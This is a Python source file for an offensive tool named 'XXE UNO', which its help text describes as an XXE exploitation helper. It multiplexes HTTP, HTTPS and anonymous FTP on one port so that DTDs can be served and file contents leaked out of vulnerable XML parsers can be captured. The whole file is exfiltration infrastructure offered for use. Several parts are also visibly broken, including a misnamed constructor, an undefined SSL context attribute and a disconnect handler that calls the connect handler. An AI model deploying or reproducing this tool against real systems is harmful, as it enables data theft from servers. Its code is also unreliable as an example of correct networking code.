import argparse
import time
import os
import subprocess
from enum import Enum
from twisted.internet import reactor, interfaces, protocol, error, defer, ssl
from twisted.web.server import Site
from twisted.web.static import File
from twisted.cred.portal import Portal
from twisted.protocols import basic
from twisted.protocols.ftp import FTPFactory, FTP, FTPRealm
from twisted.protocols.ftp import ENTERING_PASV_MODE, CMD_NOT_IMPLMNTD, DATA_CNX_ALREADY_OPEN_START_XFR,TXFR_COMPLETE_OK
from twisted.cred.checkers import AllowAnonymousAccess
from twisted.web import proxy, http

def parse_certificate_files(args):
    # Check if the certificate and key already exist
    if not os.path.exists(args.cert_file) or not os.path.exists(args.key_file):
        print("Certificate or key file not found. Generating new ones...")

        # Define the OpenSSL command to generate a self-signed certificate
        openssl_command = [
            "openssl", "req", "-x509", "-newkey", "rsa:4096",
            "-keyout", args.key_file, "-out", args.cert_file, "-days", "365", "-nodes",
            "-subj", "/C=IO/ST=IO/L=IO/O=FTPUno/CN=ftpuno.com"
        ]

        try:
            # Run the OpenSSL command
            subprocess.run(openssl_command, check=True)
            print(f"Successfully generated {args.cert_file} and {args.key_file}.")
        except subprocess.CalledProcessError as e:
            print(f"Error during OpenSSL execution: {e}")
    else:
        print("Certificate and key already exist. No need to generate new ones.")

def main(args):
    # Setup and parse certs
    parse_certificate_files(args)

    # Create Twisted Portal
    portal = Portal(FTPRealm(args.ftpdir), [AllowAnonymousAccess()])

    # Run both servers on the same port
    reactor.listenTCP(int(args.uno), UnoProxyFactory(args.ftptimeout, portal, int(args.uno), args.dtddir, args.cert_file, args.key_file))
    reactor.run()   

# Internal exception used to signify an error during parsing a path.
class InvalidPath(Exception):
    """
    Internal exception used to signify an error during parsing a path.
    """

# FTP Data Channel State
class FTPDataChannelState(Enum):
    CLOSED = 1
    AWAITING = 2
    ESTABLISHED = 3
    ERROR = 4

# HTTP Proxy Server
class HTTPProxyFactory(http.HTTPFactory):
    protocol = proxy.Proxy

class FTPDataProtocol(FTP):
    def __init(self):        
        pass

    def connectionMade(self):
        print("FTP-Data connectionMade")
        super().connectionMade()

    def connectionLost(self, reason):
        print("FTP-Data connectionLost")
        super().connectionMade(reason)

    def lineReceived(self, line):
        print("FTP-Data Received line:", line.decode())
        super().lineReceived(line)    

# FTP Data Factory
class FTPDataFactory(basic.LineReceiver):
    def buildProtocol(self, addr):
        print(addr)
        return FTPDataProtocol(self)

# Uno Proxy Server
class XXEFTPProtocol(FTP):
    def __init(self):        
        pass

    def encodeHostPort(self, host, port):
        numbers = host.split('.') + [str(port >> 8), str(port % 256)]
        return ','.join(numbers)
    
    def getDTPPort(self, factory):
        return self.passivePortRange[0]        

    def connectionMade(self):
        print("FTP connectionMade")
        super().connectionMade()

    def lineReceived(self, line):
        print("Received line:", line.decode())
        super().lineReceived(line)

    def ftp_PORT(self, address):
        print("PORT cmd received, forcing PASV mode")
        self.reply(CMD_NOT_IMPLMNTD, "PORT cmd not supported, use PASV mode")

    def ftp_PASV(self):
        """Request for a passive connection

        from the rfc::

            This command requests the server-DTP to \"listen\" on a data port
            (which is not its default data port) and to wait for a connection
            rather than initiate one upon receipt of a transfer command.  The
            response to this command includes the host and port address this
            server is listening on.
        
        In this case we only want to operate in Passive mode, hence the ftp_PORT 
        request denies a active connection. We will send the UNO port and handle 
        the connection over the UNO socket.
        """
        # if we have a DTP port set up, lose it.
        # if self.dtpFactory is not None:
        #     # cleanupDTP sets dtpFactory to none.  Later we'll do
        #     # cleanup here or something.
        #     self.cleanupDTP()
        # self.dtpFactory = DTPFactory(pi=self)
        # self.dtpFactory.setTimeout(self.dtpTimeout)
        self.dtpPort = self.getDTPPort(self.dtpFactory)

        host = self.transport.getHost().host
        port = self.dtpPort
        print(f"PASV cmd received, replying: {host}:{port}")
        self.reply(ENTERING_PASV_MODE, self.encodeHostPort(host, port))    
        self.factory.Notify_DataChannel_Requested(self.transport.getPeer().host)    
        return
    
    def toSegments(self, cwd, path):
        """
        Normalize a path, as represented by a list of strings each
        representing one segment of the path.
        """
        if path.startswith('/'):
            segs = []
        else:
            segs = cwd[:]

        for s in path.split('/'):
            if s == '.' or s == '':
                continue
            elif s == '..':
                if segs:
                    segs.pop()
                else:
                    raise InvalidPath(cwd, path)
            elif '\0' in s or '/' in s:
                raise InvalidPath(cwd, path)
            else:
                segs.append(s)
        return segs
    
    def _formatOneListResponse(self, name, size, directory, permissions, hardlinks, modified, owner, group):
        _months = [None,'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun','Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
        
        def formatMode(mode):
            print(f"mode {mode} : {type(mode)}")
            # return ''.join([mode & (256 >> n) and 'rwx'[n % 3] or '-' for n in range(9)])
            return "rwxr-xr-x"

        def formatDate(mtime):
            now = time.gmtime()
            info = {
                'month': _months[mtime.tm_mon],
                'day': mtime.tm_mday,
                'year': mtime.tm_year,
                'hour': mtime.tm_hour,
                'minute': mtime.tm_min
                }
            if now.tm_year != mtime.tm_year:
                return '%(month)s %(day)02d %(year)5d' % info
            else:
                return '%(month)s %(day)02d %(hour)02d:%(minute)02d' % info

        format = ('%(directory)s%(permissions)s%(hardlinks)4d '
                  '%(owner)-9s %(group)-9s %(size)15d %(date)12s '
                  '%(name)s\n')

        return format % {
            'directory': directory and 'd' or '-',
            'permissions': formatMode(permissions),
            'hardlinks': hardlinks,
            'owner': owner[:8],
            'group': group[:8],
            'size': size,
            'date': formatDate(time.gmtime(modified)),
            'name': name}    

    def ftp_LIST(self, path=''):
        print(f"FTP LIST cmd {path}")
        # bug in konqueror
        if path == "-a":
            path = ''
        # bug in gFTP 2.0.15
        if path == "-aL":
            path = ''
        # bug in Nautilus 2.10.0
        if path == "-L":
            path = ''
        # bug in ange-ftp
        if path == "-la":
            path = ''

        def gotListing(results):            
            msg = ""
            for (name, attrs) in results:
                msg += self._formatOneListResponse(name, *attrs)    
            msg += "226 Directory send OK"
            print(msg)
            self.sendLine(msg)        
            return (TXFR_COMPLETE_OK,)

        try:
            segments = self.toSegments(self.workingDirectory, path)
        except InvalidPath as e:
            return defer.fail(FileNotFoundError(path))

        d = self.shell.list(
            segments,
            ('size', 'directory', 'permissions', 'hardlinks',
             'modified', 'owner', 'group'))
        d.addCallback(gotListing)
        return d

    def ftp_STOR(self, path):        
        print("STOR command received. Path:", path)
        self.reply(DATA_CNX_ALREADY_OPEN_START_XFR)

# XXE FTP Proxy Server
class XXEFTPFactory(FTPFactory):
    protocol = XXEFTPProtocol
    
    def __init__(self, portal, dataport, unoFactory):
        super().__init__(portal)
        self.allowAnonymous = True        
        self.unoFactory = unoFactory
        self.protocol.portal = self.portal
        self.passivePortRange = [dataport]
        self.welcomeMessage = 'Welcome to XXE UNO FTP server.'

    def Notify_DataChannel_Requested(self, client_addr):
        self.unoFactory.Notify_DataChannel_Requested(client_addr)

# Uno Proxy Server
class UnoProxyProtocol(basic.LineReceiver):
    def __init__(self, factory):        
        self.factory = factory
        self.timeout_task = None
        self.ftp_timeout_duration = factory.ftp_timeout_duration
        print('Setting raw data mode')
        self.setRawMode()
    
    def setTimeout(self):
        self.timeout_task = reactor.callLater(self.ftp_timeout_duration, self.timeoutOccurred)

    def connectionMade(self):        
        print("Uno Connection made")
        self.setTimeout()

    def resetTimeout(self):
        if self.timeout_task and self.timeout_task.active():
            self.timeout_task.reset(self.ftp_timeout_duration)

    def stopTimeout(self):
        if self.timeout_task and self.timeout_task.active():
            self.timeout_task.cancel()

    def timeoutOccurred(self):
        print("Uno Connection Timeout occurred")
        client_addr=self.transport.getPeer().host
        unoFactory=self.factory
        client_connection=None
        if client_addr in unoFactory.uno_connections:
            client_connection = unoFactory.uno_connections[client_addr]
        else:
            client_connection = {'Control':False,'Data':FTPDataChannelState.CLOSED}
            unoFactory.uno_connections[client_addr]=client_connection
        if client_connection['Control']==True:
            print(f"FTP Control Channel established for {client_addr}")
            if client_connection['Data'] == FTPDataChannelState.AWAITING:
                self.factory.pass_connection_to_ftp_data_factory(self.transport)    
        else:
            print(f"FTP Control Channel not established for {client_addr}")
            self.factory.pass_connection_to_ftp_factory(self.transport)
            client_connection['Control']=True

    def rawDataReceived(self, data):        
        self.stopTimeout()      
        print(f"raw data receiv: \n {data}")

        # Handle incoming data
        if data.startswith(b'\x16\x03'):
            print("TLS/SSL detected")
            ssl_flag=True
        else:
            print("Not a TLS/SSL connection")
            ssl_flag=False

        print(f"Transfering HTTP request")
        self.factory.pass_connection_to_http_factory(self.transport,data, ssl_flag) 

# SSL Wrapping Protocol
# class SSLWrappingProtocol(WrappingProtocol):
#     def __init__(self, contextFactory):
#         self.contextFactory = contextFactory

#     def connectionMade(self):
#         # If the transport isn't already using SSL, wrap it
#         if not isinstance(self.transport, ssl.SSLServerTransport):            
#             self.transport = ssl.SSLServerTransport(self.transport, self.contextFactory.getContext(), False, self)
#         super().connectionMade()

class SSLWrappingProtocol(protocol.Protocol):
    def __init__(self, transport, contextFactory):
        self.transport = transport
        self.contextFactory = contextFactory

    def connectionMade(self):
        # Wrap the transport with SSL using the context factory
        self.sslContext = self.contextFactory.getContext()
        self.transport = ssl.SSLTransport(self.transport, self.sslContext, False, self)
        self.transport.protocol = self
        self.transport.startTLS(self.sslContext)

    def dataReceived(self, data):
        # Handle incoming data
        print(f"Received data: {data}")

# TCP Proxy Server
class UnoProxyFactory(protocol.Factory):
    def __init__(self,timeout, portal, dataport, rootdir, certfile, keyfile):
        self.uno_connections={}
        self.ftp_timeout_duration = timeout
        self.rootdir = rootdir
        self.http_factory = self.createHTTPSiteFactory()
        self.http_factory_running = False
        self.ftp_factory = XXEFTPFactory(portal, dataport, self)
        self.ftp_factory_running = False
        self.ftp_data_factory = FTPDataFactory()
        self.ftp_data_factory_running = False
        self.ssl_context = ssl.DefaultOpenSSLContextFactory(keyfile, certfile)

    def createHTTPSiteFactory(self):
        rootFs = File(self.rootdir)
        return Site(rootFs)

    def buildProtocol(self, addr):
        print(f"Incoming UNO Connection: {addr}")
        return UnoProxyProtocol(self)
    
    def Notify_DataChannel_Requested(self, client_addr):
        client_connection=None
        print(f"Notify Data Channel {client_addr} {self.uno_connections}")
        if client_addr in self.uno_connections[client_addr]:
            client_connection = self.uno_connections[client_addr]
        
        if client_connection:
            print(f"Awaiting FTP Data Channel for {client_addr}")
            client_connection['Data']=FTPDataChannelState.AWAITING                        

    def pass_connection_to_ftp_factory(self, transport):
        print(f"Passing Uno Connection {transport.getPeer().host}:{transport.getPeer().port} to FTP Control Channel")
                
        if not self.ftp_factory_running:
            self.ftp_factory.startFactory()
            self.ftp_factory_running=True        
        
        ftp_protocol = self.ftp_factory.buildProtocol(None)
        if ftp_protocol is None:
            # Handle case where the factory may not return a protocol
            print("Failed to create FTP protocol.")
            transport.loseConnection()
            return

        transport.protocol = ftp_protocol
        ftp_protocol.makeConnection(transport)

    def pass_connection_to_ftp_data_factory(self, transport):
        print(f"Passing Uno Connection {transport.getPeer().host}:{transport.getPeer().port} to FTP Data Channel")
                
        if not self.ftp_data_factory_running:
            self.ftp_data_factory.startFactory()
            self.ftp_data_factory_running=True 
        
        ftp_protocol = self.ftp_data_factory.buildProtocol(None)
        transport.protocol = ftp_protocol
        ftp_protocol.makeConnection(transport)

    def pass_connection_to_http_factory(self, transport, initial_data, is_https):        
        print(f"Passing Connection {transport.getPeer().host}:{transport.getPeer().port} to HTTP Server")
        
        # Ensure the HTTP factory is started once (not repeatedly)
        if not self.http_factory_running:
            self.http_factory.startFactory()
            self.http_factory_running=True

        # Setup the HTTP Protocol
        http_protocol = self.http_factory.buildProtocol(None)
        if http_protocol is None:
            # Handle case where the factory may not return a protocol
            print("Failed to create HTTP protocol.")
            transport.loseConnection()
            return
        
        # Check if the connection is HTTPS, if so, wrap it in SSL
        if is_https:
            print("Wrapping connection in SSL...")
            # Set up the SSL context and wrap the transport            
            ssl_transport = ssl.SSLServerTransport(transport, self.sslContextFactory.getContext(), False, http_protocol)
            http_protocol.makeConnection(ssl_transport)
        else:
            print("Handling plain HTTP...")                    
            transport.protocol = http_protocol
            http_protocol.makeConnection(transport)        

        # Manually pass any initial data if needed (e.g., the HTTP request data may already be partially received)        
        if initial_data:
            http_protocol.dataReceived(initial_data)



if __name__ == '__main__':
    parser = argparse.ArgumentParser(
                            description = 'XXE UNO - XXE exploitation helper, aids OAST explotation of XXE vulnerabilities over a single port using FTP egress')
    parser.add_argument('-o',
                        '--outfile',
                        help='path to the target output file',
                        default='./output.txt',
                        required=False) 
    parser.add_argument('--ftpport',
                        help='FTP Port to listen on (default 2121)')                        
    parser.add_argument('-u',
                        '--uno',
                        default='5000',
                        required=False,
                        help='Global port to listen on (default 5000)') 
    parser.add_argument('-wd',
                        '--dtddir',
                        help='Folder to server DTD(s) from (default "./")',
                        required=False,
                        default="./") 
    parser.add_argument('-fd',
                        '--ftpdir',
                        help='Folder to server FTP from (default "./")',
                        required=False,
                        default="./") 
    parser.add_argument('--ftptimeout',
                        help='FTP timeout (default 3s)',
                        required=False,
                        default=3) 
    parser.add_argument('--cert_file',                        
                        help='HTTPs public cert file',
                        required=False,
                        default="./cert.pem") 
    parser.add_argument('--key_file',
                        help='HTTPs private key file',
                        required=False,
                        default="./key.pem") 
    
    args=parser.parse_args()
    if not args.outfile:
        parser.error('Please specify the target output file path')
    
    main(args)